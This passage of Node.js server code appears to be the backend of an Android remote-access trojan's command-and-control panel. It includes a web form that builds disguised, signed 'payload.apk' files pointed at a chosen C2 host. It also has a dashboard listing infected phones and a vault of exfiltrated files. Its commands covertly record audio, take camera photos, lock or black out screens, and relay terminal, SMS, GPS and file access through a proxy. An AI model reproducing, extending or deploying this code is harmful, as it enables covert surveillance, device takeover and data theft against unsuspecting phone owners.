        .adm-topbar{height:56px;background:var(--adm-card);border-bottom:1px solid var(--adm-border);display:flex;align-items:center;justify-content:space-between;padding:0 24px;position:sticky;top:0;z-index:5}
        .adm-topbar h1{font-size:15px;font-weight:600}
        .adm-topbar-right{display:flex;align-items:center;gap:14px;color:var(--adm-muted);font-size:12.5px;font-variant-numeric:tabular-nums}
        .adm-badge{background:#1a1a1e;border:1px solid var(--adm-border);border-radius:999px;padding:3px 10px;font-size:12px;color:var(--adm-text)}
        .adm-content{padding:24px;flex:1}
        .adm-card{background:var(--adm-card);border:1px solid var(--adm-border);border-radius:10px;padding:20px;max-width:680px}
        .adm-card h2{font-size:13px;font-weight:600;color:var(--adm-muted);margin-bottom:18px}
        .adm-field{margin-bottom:16px}
        .adm-label{display:block;font-size:12px;color:var(--adm-muted);margin-bottom:6px}
        .adm-input{width:100%;background:#1a1a1e;border:1px solid var(--adm-border);border-radius:6px;color:var(--adm-text);padding:9px 12px;font-size:13px;font-family:inherit}
        .adm-input:focus{outline:none;border-color:#3f3f46}
        .adm-hint{font-size:11px;color:#52525b;margin-top:4px}
        .adm-btn{display:inline-block;background:#1a1a1e;border:1px solid var(--adm-border);color:var(--adm-text);padding:8px 18px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;transition:opacity .12s;font-family:inherit}
        .adm-btn:hover{opacity:.85}
        .adm-btn-primary{background:var(--adm-text);color:var(--adm-bg);border-color:var(--adm-text)}
        .adm-btn:disabled{opacity:.4;cursor:not-allowed}
        .adm-note{font-size:12px;color:var(--adm-muted);background:#141417;border:1px solid var(--adm-border);border-radius:8px;padding:12px;margin-top:18px;line-height:1.8}
        .adm-toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1a1a1e;border:1px solid var(--adm-border);color:var(--adm-text);padding:10px 18px;border-radius:8px;font-size:12.5px;display:none;z-index:1000;white-space:nowrap}
        @media (max-width:768px){.adm-sidebar{width:64px;flex:0 0 64px}.adm-sidebar-title,.adm-nav a span,.adm-sidebar-foot span{display:none}.adm-main{margin-left:64px}}
    </style>
</head>
<body>
    <div class="adm-layout">
        <aside class="adm-sidebar">
            <div class="adm-sidebar-title">控制中心</div>
            <nav class="adm-nav">
                <a href="/"><span>设备管理</span></a>
                <a href="/#vault"><span>外泄保险库</span></a>
                <a href="/builder" class="adm-active"><span>构造中心</span></a>
            </nav>
            <div class="adm-sidebar-foot"><span class="adm-dot" style="display:inline-block;width:6px;height:6px;border-radius:50%;background:#34d399;margin-right:6px"></span><span>隧道网关 · 正常</span></div>
        </aside>
        <main class="adm-main">
            <header class="adm-topbar">
                <h1>构造中心</h1>
                <div class="adm-topbar-right"><span class="adm-badge">${builderArtifactsReady() ? '构造模块 · 就绪' : '构造模块 · 未就绪'}</span></div>
            </header>
            <div class="adm-content">
                <div class="adm-card">
                    <h2>在线 APK 构造</h2>
                    <form id="adm-build-form">
                        <div class="adm-field">
                            <label class="adm-label" for="f-pkg">包名（等长替换，限 ${PKG_PLACEHOLDER.length} 字符）</label>
                            <input class="adm-input" id="f-pkg" name="pkg" type="text" maxlength="${PKG_PLACEHOLDER.length}" placeholder="com.stability.sync" required>
                            <div class="adm-hint">小写字母开头，仅小写字母 / 数字 / 点；长度必须为 ${PKG_PLACEHOLDER.length}（与模板占位等长）。</div>
                        </div>
                        <div class="adm-field">
                            <label class="adm-label" for="f-name">应用名（≤16 个 ASCII 字符）</label>
                            <input class="adm-input" id="f-name" name="name" type="text" maxlength="16" placeholder="System Stability" required>
                            <div class="adm-hint">不足 16 字符时自动右侧补空格（等长替换）。</div>
                        </div>
                        <div class="adm-field">
                            <label class="adm-label" for="f-c2">C2 地址（https://，≤95 字符）</label>
                            <input class="adm-input" id="f-c2" name="c2" type="url" maxlength="95" placeholder="https://your-c2-host.example.com" required>
                            <div class="adm-hint">必须是 https:// 开头；不足占位长度自动补 # 号（等长替换）。</div>
                        </div>
                        <div class="adm-field">
                            <label class="adm-label" for="f-secret">设备密钥（32 位十六进制，可留空）</label>
                            <input class="adm-input" id="f-secret" name="secret" type="text" maxlength="32" placeholder="49ac647fd2dfe2549f5968df616de504" pattern="[0-9a-fA-F]{32}">
                            <div class="adm-hint">留空 = 沿用当前面板 DEVICE_SECRET 环境值${DEVICE_SECRET ? '（当前已配置）' : '（当前未配置，必须填写）'}。</div>
                        </div>
                        <div class="adm-field">
                            <label class="adm-label" for="f-icon">图标（PNG，可选，≤1MB）</label>
                            <input class="adm-input" id="f-icon" name="icon" type="file" accept=".png,image/png">
                            <div class="adm-hint">上传后替换 res/mipmap 启动图标（同条目名写入 PNG）。</div>
                        </div>
                        <button class="adm-btn adm-btn-primary" id="adm-build-btn" type="submit">生成 APK</button>
                        <div id="adm-build-status" style="margin-top:12px;font-size:12.5px;color:var(--adm-muted)"></div>
                    </form>
                    <div class="adm-note">
                        占位符规范：包名 ${PKG_PLACEHOLDER}（${PKG_PLACEHOLDER.length} 字符）· 应用名 ${NAME_PLACEHOLDER}（${NAME_PLACEHOLDER.length} 字符）· C2 地址 96 字符模板 · 设备密钥 32 hex。<br>
                        产物：签名 APK（payload.apk，附件下载）。签名使用 builder-keystore.p12（别名 prodkey）。
                    </div>
                </div>
            </div>
        </main>
    </div>
    <div class="adm-toast" id="adm-toast"></div>
    <script>
    function showToast(msg, isError) {
        var o = document.getElementById('adm-toast');
        o.textContent = msg;
        o.style.display = 'block';
        o.style.borderColor = isError ? '#e5484d' : '#26262b';
        setTimeout(function () { o.style.display = 'none'; }, 3200);
    }
    document.getElementById('adm-build-form').addEventListener('submit', function (ev) {
        ev.preventDefault();
        var btn = document.getElementById('adm-build-btn');
        var st = document.getElementById('adm-build-status');
        btn.disabled = true;
        st.textContent = '构造中，请稍候（含签名，约需数秒）…';
        var fd = new FormData(this);
        fetch('/api/build', { method: 'POST', body: fd })
            .then(function (r) {
                var ct = r.headers.get('content-type') || '';
                if (r.ok && ct.indexOf('octet-stream') !== -1) {
                    return r.blob().then(function (blob) {
                        var a = document.createElement('a');
                        a.href = URL.createObjectURL(blob);
                        a.download = 'payload.apk';
                        document.body.appendChild(a);
                        a.click();
                        setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 3000);
                        st.textContent = '';
                        showToast('APK 已生成并开始下载');
                    });
                }
                return r.json().then(function (j) {
                    st.textContent = '';
                    showToast('构造失败：' + (j.error || '未知错误'), true);
                });
            })
            .catch(function () {
                st.textContent = '';
                showToast('网络错误，请重试', true);
            })
            .finally(function () { btn.disabled = false; });
    });
    </script>
</body>
</html>`;
}

// ---- 构造接口 POST /api/build ----
app.post('/api/build', async (req, res) => {
    let tmpFiles = [];
    const cleanup = () => {
        for (const f of tmpFiles) {
            try { if (f && fs.existsSync(f)) fs.unlinkSync(f); } catch (e) {}
            try { if (f && fs.existsSync(f + '.idsig')) fs.unlinkSync(f + '.idsig'); } catch (e) {}
        }
    };
    try {
        if (!builderArtifactsReady()) {
            return res.status(503).json({ success: false, error: '构造模块未就绪：builder/template.apk、builder-keystore.p12 或 apksigner.jar 缺失（等待构建端产出）' });
        }
        let pkg = '', name = '', c2 = '', secret = '', iconBuf = null;
        const contentType = req.headers['content-type'] || '';
        if (contentType.includes('application/json')) {
            const b = req.body || {};
            pkg = String(b.pkg || '');
            name = String(b.name || '');
            c2 = String(b.c2 || '');
            secret = String(b.secret || '');
            if (b.iconBase64) iconBuf = Buffer.from(String(b.iconBase64), 'base64');
        } else if (contentType.includes('multipart/form-data')) {
            const boundary = (contentType.split('boundary=')[1] || '').trim().replace(/^"|"$/g, '');
            if (!boundary) return res.status(400).json({ success: false, error: '缺少 multipart boundary' });
            const raw = await readRawBody(req, 64 * 1024 * 1024);
            const parsed = parseMultipartFields(raw, boundary);
            pkg = (parsed.fields.pkg || '').trim();
            name = (parsed.fields.name || '').trim();
            c2 = (parsed.fields.c2 || '').trim();
            secret = (parsed.fields.secret || '').trim();
            if (parsed.files.icon) iconBuf = parsed.files.icon;
        } else {
            return res.status(400).json({ success: false, error: '请使用 multipart/form-data 或 application/json' });
        }

        // ---- 字段校验 ----
        if (!/^[a-z][a-z0-9.]*$/.test(pkg)) {
            return res.status(400).json({ success: false, error: '包名格式不合法：须小写字母开头，仅含小写字母 / 数字 / 点' });
        }
        if (pkg.length !== PKG_PLACEHOLDER.length) {
            return res.status(400).json({ success: false, error: '包名长度必须等于 ' + PKG_PLACEHOLDER.length + '（等长替换）' });
        }
        if (!/^[\x20-\x7e]*$/.test(name) || name.length === 0 || name.length > 16) {
            return res.status(400).json({ success: false, error: '应用名须为 1-16 个 ASCII 字符' });
        }
        const paddedName = name.padEnd(NAME_PLACEHOLDER.length, ' ');
        if (!/^https:\/\//.test(c2) || c2.length > 95) {
            return res.status(400).json({ success: false, error: 'C2 地址须为 https:// 开头且不超过 95 字符' });
        }
        const paddedC2 = c2.padEnd(C2_PLACEHOLDER.length, '#');
        let finalSecret = secret;
        if (!finalSecret) finalSecret = DEVICE_SECRET || '';
        if (!/^[0-9a-f]{32}$/i.test(finalSecret)) {
            const hint = secret ? '设备密钥须为 32 位十六进制' : '设备密钥须为 32 位十六进制（留空则沿用服务端 DEVICE_SECRET，但当前未配置）';
            return res.status(400).json({ success: false, error: hint });
        }
        finalSecret = finalSecret.toLowerCase();
        if (iconBuf) {
            if (iconBuf.length > 1024 * 1024) {
                return res.status(400).json({ success: false, error: '图标不得超过 1MB' });
            }
            if (iconBuf.length < 8 || iconBuf.readUInt32BE(0) !== 0x89504e47) {
                return res.status(400).json({ success: false, error: '图标须为 PNG 格式（PNG 魔数校验失败）' });
            }
        }

        // ---- 替换占位 + 重打包 ----
        const templateBuf = fs.readFileSync(TEMPLATE_APK_PATH);
        const patched = patchApk(templateBuf, pkg, paddedName, paddedC2, finalSecret, iconBuf);

        // ---- 签名 ----
        const tmpBase = path.join(BUILDER_DIR, 'tmp_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8));
        const patchedPath = tmpBase + '_patched.apk';
        const outPath = tmpBase + '_signed.apk';
        tmpFiles.push(patchedPath, outPath);
        fs.writeFileSync(patchedPath, patched.out);

        const java = findJava();
        if (!java) {
            throw new Error('未找到 Java 运行时（签名需要 JRE/JDK；Render 上由 buildCommand 预下载到 /tmp）');
        }
        const ksPass = process.env.BUILDER_KS_PASS || 'Builder!Ks2026';
        if (!process.env.BUILDER_KS_PASS) {
            console.warn('[LAB-RATS C2] WARNING: BUILDER_KS_PASS not set, using default keystore passphrase.');
        }

        // ---- zipalign（若 builder/zipalign 存在；否则依赖内存重建时已做的 4/4096 对齐） ----
        let alignInput = patchedPath;
        const zipalignBin = path.join(BUILDER_DIR, process.platform === 'win32' ? 'zipalign.exe' : 'zipalign');
        if (fs.existsSync(zipalignBin)) {
            const alignedPath = tmpBase + '_aligned.apk';
            tmpFiles.push(alignedPath);
            try {
                await execFileAsync(zipalignBin, ['-f', '-p', '4', patchedPath, alignedPath]);
                alignInput = alignedPath;
                console.log('[LAB-RATS C2] zipalign done.');
            } catch (e2) {
                console.warn('[LAB-RATS C2] WARNING: zipalign failed (' + e2.message + '); falling back to in-memory alignment.');
            }
        } else {
            console.log('[LAB-RATS C2] zipalign binary not found; using in-memory zip alignment.');
        }

        await execFileAsync(java, [
            '-jar', APKSIGNER_PATH, 'sign',
            '--ks', KEYSTORE_PATH, '--ks-type', 'PKCS12',
            '--ks-pass', 'pass:' + ksPass,
            '--ks-key-alias', 'prodkey',
            '--out', outPath, alignInput
        ]);

        console.log(`[BUILD OK] pkg=${pkg} name="${name}" c2=${c2} icon=${patched.counts.iconSwapped ? 'yes' : 'no'} ` +
            `(占位替换 pkg=${patched.counts.pkgN} name=${patched.counts.nameN} c2=${patched.counts.c2N} secret=${patched.counts.secN})`);

        res.download(outPath, 'payload.apk', () => cleanup());
    } catch (err) {
        cleanup();
        console.error('[BUILD FAIL]', err.message);
        return res.status(500).json({ success: false, error: '构造失败：' + err.message });
    }
});

app.get('/builder', (req, res) => {
    res.send(serveBuilderPage());
});

// Route Handler for Render C2 Dashboard Navigation
app.get(['/c2-dashboard', '/c2-home', '/render-c2'], (req, res) => {
    return res.redirect('/');
});



// GET / serves Operator Dashboard HTML or handles GET check-ins
app.get('/', (req, res) => {
    if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
        return handleCheckin(req, res);
    }

    syncUploadsDirectory();

    const deviceList = Array.from(devices.values());
    const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;

    let devicesHtml = deviceList.length === 0 ?
        '<tr><td colspan="9" class="adm-empty">暂无设备接入</td></tr>' :
        deviceList.map(d => {
            const displayName = (d.alias && d.alias.trim()) ? d.alias.trim() : (d.brand || d.deviceId || '未知设备');
            const subName = (d.alias && d.alias.trim()) ? ` (${d.brand || ''})` : '';

            const ageSec = (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000;
            let statusBadge = '';
            if (ageSec < 45) {
                statusBadge = '<span class="adm-status"><span class="adm-dot adm-dot-green"></span>在线</span>';
            } else if (ageSec < 300) {
                statusBadge = '<span class="adm-status"><span class="adm-dot adm-dot-yellow"></span>空闲</span>';
            } else {
                statusBadge = '<span class="adm-status"><span class="adm-dot adm-dot-red"></span>离线</span>';
            }

            const isAnyActive = d.blackout || d.locked || d.flashlight || d.recording;
            const activeDot = isAnyActive ?
                '<span class="adm-dot adm-dot-green" style="margin-left:6px" title="有动作运行中"></span>' :
                '';

            return `
            <tr>
                <td>
                    <button class="adm-pencil" onclick="renameDevice('${jsStr(d.deviceId)}', '${jsStr(d.alias || '')}')" title="重命名">✎</button>
                    <span class="adm-mono">${escapeHtml(displayName)}</span><span class="adm-muted" style="font-size:11px">${escapeHtml(subName)}</span>
                </td>
                <td>${escapeHtml(d.model || '—')}</td>
                <td>Android ${escapeHtml(d.os || '16')}</td>
                <td>${escapeHtml(d.battery || '100%')}</td>
                <td class="adm-mono">${escapeHtml(d.ip || 'N/A')}:${escapeHtml(String(d.port || '9191'))}</td>
                <td>${statusBadge}</td>
                <td>${d.stealth ? '<span style="color:#eab308">隐身</span>' : '<span class="adm-muted">正常</span>'}${activeDot}</td>
                <td class="adm-muted" style="font-size:12px">${formatTime(d.lastSeen)}</td>
                <td>
                    <a class="adm-btn adm-btn-sm" href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}">连接</a>
                    <select class="adm-select" onchange="dispatchQuickCommand('${jsStr(d.deviceId)}', this.value); this.selectedIndex=0;">
                        <option value="" disabled selected>下发命令</option>
                        <option value="mic">录音 60 秒</option>
                        <option value="flashlight">手电筒</option>
                        <option value="blackout">黑屏</option>
                        <option value="lock">锁定</option>
                        <option value="volume">最大音量</option>
                        <option value="photo">后摄快照</option>
                    </select>
                    <button class="adm-btn adm-btn-sm adm-btn-danger" onclick="deleteDevice('${jsStr(d.deviceId)}')">删除</button>
                </td>
            </tr>
            `;
        }).join('');

    let exfilHtml = exfiltratedFiles.length === 0 ?
        '<tr><td colspan="5" class="adm-empty">暂无外泄数据</td></tr>' :
        exfiltratedFiles.map(f => {
            const devObj = devices.get(f.deviceId);
            const devLabel = devObj ? ((devObj.alias && devObj.alias.trim()) ? devObj.alias.trim() : (devObj.brand || f.deviceId)) : f.deviceId;
            return `
            <tr>
                <td class="adm-mono">${escapeHtml(f.originalName)}</td>
                <td class="adm-muted">${escapeHtml(devLabel)}</td>
                <td class="adm-mono">${formatFileSize(f.size)}</td>
                <td class="adm-muted" style="font-size:12px">${formatTime(f.timestamp)}</td>
                <td>
                    <a class="adm-btn adm-btn-sm" href="/c2/downloads/${encodeURIComponent(f.filename)}" download="${escapeHtml(f.originalName)}">下载</a>
                    <button class="adm-btn adm-btn-sm adm-btn-danger" onclick="deleteExfil('${jsStr(f.id)}')">删除</button>
                </td>
            </tr>
            `;
        }).join('');

    const html = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>控制中心</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root{--adm-bg:#0a0a0a;--adm-card:#111113;--adm-border:#26262b;--adm-text:#fafafa;--adm-muted:#a1a1aa;--adm-green:#34d399;--adm-yellow:#eab308;--adm-danger:#e5484d}
        *{box-sizing:border-box;margin:0;padding:0}
        html,body{height:100%}
        body{background:var(--adm-bg);color:var(--adm-text);font-family:'Inter','Noto Sans SC',-apple-system,'Segoe UI','Microsoft YaHei',sans-serif;font-size:14px;-webkit-font-smoothing:antialiased}
        .adm-layout{display:flex;min-height:100vh}
        .adm-sidebar{width:220px;flex:0 0 220px;background:var(--adm-card);border-right:1px solid var(--adm-border);display:flex;flex-direction:column;position:fixed;top:0;bottom:0;left:0;z-index:10}
        .adm-sidebar-title{padding:20px 20px 16px;font-size:15px;font-weight:700;border-bottom:1px solid var(--adm-border)}
        .adm-nav{flex:1;padding:12px 10px}
        .adm-nav a{display:block;padding:10px 12px;border-radius:8px;color:var(--adm-muted);text-decoration:none;font-size:13.5px;font-weight:500;transition:opacity .12s}
        .adm-nav a:hover{opacity:.8}
        .adm-nav a.adm-active{background:#1a1a1e;color:var(--adm-text)}
        .adm-sidebar-foot{padding:14px 20px;border-top:1px solid var(--adm-border);font-size:11.5px;color:var(--adm-muted);white-space:nowrap}
        .adm-main{flex:1;margin-left:220px;display:flex;flex-direction:column;min-width:0}
        .adm-topbar{height:56px;background:var(--adm-card);border-bottom:1px solid var(--adm-border);display:flex;align-items:center;justify-content:space-between;padding:0 24px;position:sticky;top:0;z-index:5}
        .adm-topbar h1{font-size:15px;font-weight:600}
        .adm-topbar-right{display:flex;align-items:center;gap:14px;color:var(--adm-muted);font-size:12.5px;font-variant-numeric:tabular-nums}
        .adm-badge{background:#1a1a1e;border:1px solid var(--adm-border);border-radius:999px;padding:3px 10px;font-size:12px;color:var(--adm-text)}
        .adm-content{padding:24px;flex:1}
        .adm-view{display:none}
        .adm-view.adm-visible{display:block}
        .adm-card{background:var(--adm-card);border:1px solid var(--adm-border);border-radius:10px;padding:20px}
        .adm-card h2{font-size:13px;font-weight:600;color:var(--adm-muted);margin-bottom:14px}
        .adm-table{width:100%;border-collapse:collapse}
        .adm-table th{text-align:left;padding:10px 12px;font-size:11.5px;font-weight:500;color:var(--adm-muted);border-bottom:1px solid var(--adm-border);white-space:nowrap}
        .adm-table td{padding:12px;border-bottom:1px solid #1a1a1e;font-size:13px;white-space:nowrap;font-variant-numeric:tabular-nums;vertical-align:middle}
        .adm-table tbody tr:hover{background:#141417}
        .adm-mono{font-family:ui-monospace,Consolas,'Courier New',monospace;font-size:12px}
        .adm-muted{color:var(--adm-muted)}
        .adm-btn{display:inline-block;background:#1a1a1e;border:1px solid var(--adm-border);color:var(--adm-text);padding:6px 12px;border-radius:6px;font-size:12px;font-weight:500;cursor:pointer;text-decoration:none;transition:opacity .12s;font-family:inherit;line-height:1.4}
        .adm-btn:hover{opacity:.8}
        .adm-btn-danger{background:rgba(229,72,77,.12);border-color:rgba(229,72,77,.4);color:#f2a3a5}
        .adm-btn-sm{padding:4px 10px;font-size:11.5px}
        .adm-select{background:#1a1a1e;border:1px solid var(--adm-border);color:var(--adm-text);padding:5px 10px;border-radius:6px;font-size:12px;font-family:inherit;cursor:pointer}
        .adm-status{display:inline-flex;align-items:center;gap:6px;font-size:12px}
        .adm-dot{width:6px;height:6px;border-radius:50%;display:inline-block;flex:0 0 6px}
        .adm-dot-green{background:var(--adm-green)}
        .adm-dot-yellow{background:var(--adm-yellow)}
        .adm-dot-red{background:var(--adm-danger)}
        .adm-empty{padding:28px;text-align:center;color:var(--adm-muted);font-size:13px}
        .adm-pencil{cursor:pointer;color:var(--adm-muted);font-size:12px;padding:2px 4px;transition:opacity .12s;border:none;background:none;font-family:inherit}
        .adm-pencil:hover{opacity:.7}
        .adm-toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1a1a1e;border:1px solid var(--adm-border);color:var(--adm-text);padding:10px 18px;border-radius:8px;font-size:12.5px;display:none;z-index:1000;white-space:nowrap}
        @media (max-width:768px){
            .adm-sidebar{width:64px;flex:0 0 64px}
            .adm-sidebar-title,.adm-nav a span,.adm-sidebar-foot span{display:none}
            .adm-main{margin-left:64px}
        }
    </style>
</head>
<body>
    <div class="adm-layout">
        <aside class="adm-sidebar">
            <div class="adm-sidebar-title">控制中心</div>
            <nav class="adm-nav">
                <a href="#devices" data-view="devices" class="adm-active"><span>设备管理</span></a>
                <a href="#vault" data-view="vault"><span>外泄保险库</span></a>
                <a href="/builder"><span>构造中心</span></a>
            </nav>
            <div class="adm-sidebar-foot"><span class="adm-dot adm-dot-green"></span><span>隧道网关 · 正常</span></div>
        </aside>
        <main class="adm-main">
            <header class="adm-topbar">
                <h1>控制中心</h1>
                <div class="adm-topbar-right">
                    <span class="adm-badge" id="adm-online-badge">在线设备 ${onlineCount} / ${deviceList.length}</span>
                    <span id="adm-clock">--:--:--</span>
                </div>
            </header>
            <div class="adm-content">
                <section class="adm-view adm-visible" id="view-devices">
                    <div class="adm-card">
                        <h2>设备管理</h2>
                        <table class="adm-table">
                            <thead>
                                <tr>
                                    <th>设备 ID</th><th>型号</th><th>系统</th><th>电量</th><th>端点</th><th>状态</th><th>资料</th><th>最近心跳</th><th>操作</th>
                                </tr>
                            </thead>
                            <tbody>${devicesHtml}</tbody>
                        </table>
                        <div style="margin-top:14px;text-align:right">
                            <button class="adm-btn" onclick="location.reload()">刷新列表</button>
                        </div>
                    </div>
                </section>
                <section class="adm-view" id="view-vault">
                    <div class="adm-card">
                        <h2>外泄保险库 · 共 ${exfiltratedFiles.length} 份</h2>
                        <table class="adm-table">
                            <thead>
                                <tr>
                                    <th>文件</th><th>来源设备</th><th>大小</th><th>时间</th><th>操作</th>
                                </tr>
                            </thead>
                            <tbody>${exfilHtml}</tbody>
                        </table>
                        <div style="margin-top:14px;text-align:right">
                            <button class="adm-btn" onclick="location.reload()">刷新列表</button>
                        </div>
                    </div>
                </section>
            </div>
        </main>
    </div>
    <div class="adm-toast" id="adm-toast"></div>
    <script>
    (function () {
        function setView(name) {
            var views = document.querySelectorAll('.adm-view');
            for (var i = 0; i < views.length; i++) {
                views[i].classList.toggle('adm-visible', views[i].id === 'view-' + name);
            }
            var links = document.querySelectorAll('.adm-nav a');
            for (var j = 0; j < links.length; j++) {
                links[j].classList.toggle('adm-active', links[j].getAttribute('data-view') === name);
            }
        }
        function applyHash() {
            var h = (location.hash || '#devices').replace('#', '');
            setView(h === 'vault' ? 'vault' : 'devices');
        }
        window.addEventListener('hashchange', applyHash);
        applyHash();
        function tick() {
            document.getElementById('adm-clock').textContent = new Date().toLocaleTimeString('zh-CN', { hour12: false });
        }
        tick();
        setInterval(tick, 1000);
    })();

    function showToast(msg, isError) {
        var o = document.getElementById('adm-toast');
        o.textContent = msg;
        o.style.display = 'block';
        o.style.borderColor = isError ? '#e5484d' : '#26262b';
        setTimeout(function () { o.style.display = 'none'; }, 2600);
    }

    function renameDevice(deviceId, currentAlias) {
        var newName = prompt('输入设备别名：', currentAlias || '');
        if (newName !== null && newName.trim() !== '') {
            fetch('/api/rename-device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: deviceId, alias: newName.trim() })
            })
            .then(function (r) { return r.json(); })
            .then(function (data) {
                if (data.success) { showToast('已重命名'); setTimeout(function () { location.reload(); }, 600); }
                else { showToast('重命名失败：' + (data.error || '未知错误'), true); }
            })
            .catch(function () { showToast('网络错误', true); });
        }
    }

    function dispatchQuickCommand(deviceId, action) {
        if (!action) return;
        var path = '/';
        var label = '';
        if (action === 'mic') { path = '/audio/mic/start?duration=60'; label = '录音 60 秒'; }
        else if (action === 'flashlight') { path = '/device/flashlight'; label = '手电筒'; }
        else if (action === 'blackout') { path = '/ghost/interact?action=blackout'; label = '黑屏'; }
        else if (action === 'lock') { path = '/ghost/lock'; label = '锁定'; }
        else if (action === 'volume') { path = '/device/max-volume'; label = '最大音量'; }
        else if (action === 'photo') { path = '/camera/photo?cam=0'; label = '后摄快照'; }
        var fullUrl = '/proxy' + path + (path.indexOf('?') !== -1 ? '&' : '?') + 'deviceId=' + encodeURIComponent(deviceId);
        fetch(fullUrl)
            .then(function (r) {
                if (r.ok) { showToast('命令已下发：' + label); setTimeout(function () { location.reload(); }, 600); }
                else { showToast('下发失败（HTTP ' + r.status + '）', true); }
            })
            .catch(function () { showToast('网络错误', true); });
    }

    function deleteExfil(id) {
        if (confirm('确定永久删除该文件？')) {
            fetch('/api/delete-exfil', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: id })
            })
            .then(function (r) { return r.json(); })
            .then(function (data) {
                if (data.success) { showToast('已删除'); setTimeout(function () { location.reload(); }, 600); }
                else { showToast('删除失败：' + (data.error || '未知错误'), true); }
            })
            .catch(function () { showToast('网络错误', true); });
        }
    }

    function deleteDevice(deviceId) {
        if (confirm('确定从列表删除该设备？')) {
            fetch('/api/delete-device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: deviceId })
            })
            .then(function (r) { return r.json(); })
            .then(function (data) {
                if (data.success) { showToast('已删除'); setTimeout(function () { location.reload(); }, 600); }
                else { showToast('删除失败：' + (data.error || '未知错误'), true); }
            })
            .catch(function () { showToast('网络错误', true); });
        }
    }
    </script>
</body>
</html>`;

    res.send(html);
});

// Catch-All Device Proxy Handler (Proxies all module tabs: /terminal, /ghost, /camera, /gps, /files, /sms, etc.)
app.all('*', (req, res) => {
    if (req.path === '/favicon.ico') return res.status(404).end();

    let deviceId = req.query.deviceId || getCookie(req.headers.cookie, 'c2_target_device') || lastActiveDeviceId;

    // Fallback: Pick the most recently active checked-in device
    if (!deviceId && devices.size > 0) {
        let latestDevice = null;
        let latestTime = 0;
        for (const [id, dev] of devices.entries()) {
            const t = new Date(dev.lastSeen || 0).getTime();
            if (t > latestTime) {
                latestTime = t;
                latestDevice = id;
            }
        }
        deviceId = latestDevice || Array.from(devices.keys())[0];
    }

    if (deviceId) {
        lastActiveDeviceId = deviceId;
        res.setHeader('Set-Cookie', `c2_target_device=${encodeURIComponent(deviceId)}; Path=/; SameSite=Lax`);
    }

    // [FIX] No phantom seed devices: unknown deviceIds are NOT created.
    // Commands for devices that never checked in simply time out (TUNNEL_GATEWAY_TIMEOUT).

    const requestId = Math.random().toString(36).substring(7);
    let relayPath = req.originalUrl.replace('/proxy', '') || '/';
    if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;

    pendingResponses.set(requestId, { res });

    let requestBody = '';
    const contentType = req.headers['content-type'] || '';
    if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
        if (typeof req.body === 'string') {
            requestBody = req.body;
        } else if (req.body && typeof req.body === 'object') {
            if (contentType.includes('application/json')) {
                requestBody = JSON.stringify(req.body);
            } else {
                requestBody = new URLSearchParams(req.body).toString();
            }
        }
    }

    const cmdObj = {
        type: 'request',
        id: requestId,
        method: req.method,
        path: relayPath,
        cookie: req.headers.cookie || '',
        body: requestBody,
        contentType: contentType || 'application/x-www-form-urlencoded'
    };

    dispatchCommand(deviceId, cmdObj);

    setTimeout(() => {
        if (pendingResponses.has(requestId)) {
            pendingResponses.delete(requestId);
            if (!res.headersSent) res.status(504).send('<!DOCTYPE html><html><body style="background:#02080d;color:#ff3131;font-family:monospace;padding:40px;text-align:center;"><h2>TUNNEL_GATEWAY_TIMEOUT</h2><p>Device is offline or not polling.</p></body></html>');
        }
    }, 25000);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
});
